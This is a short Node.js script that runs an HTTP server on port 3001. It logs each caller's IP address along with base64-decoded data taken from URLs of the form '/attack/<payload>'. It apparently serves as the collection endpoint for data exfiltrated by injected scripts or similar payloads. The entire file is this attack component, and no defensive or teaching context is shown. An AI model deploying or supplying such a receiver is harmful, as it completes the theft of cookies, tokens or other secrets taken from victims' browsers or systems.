require("http")
  .createServer((req, res) => {
    console.log(
      req.connection.remoteAddress,
      Buffer(req.url.split("/attack/")[1], "base64").toString().trim()
    );
  })
  .listen(3001);

